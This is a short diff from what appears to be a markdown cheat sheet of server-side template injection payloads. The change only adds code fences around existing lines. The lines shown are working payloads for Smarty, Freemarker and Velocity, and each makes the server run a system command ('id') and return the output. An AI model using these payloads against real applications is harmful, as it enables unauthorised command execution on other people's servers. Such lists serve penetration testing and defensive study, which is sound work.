@@ -35,8 +35,10 @@ Smarty:
 {system('id')}
 
 ## Java: Freemarker and Velocity
+```
 <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
 #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$out.read()#end
+```
 
 ## Ruby and Node.js
 ERB:
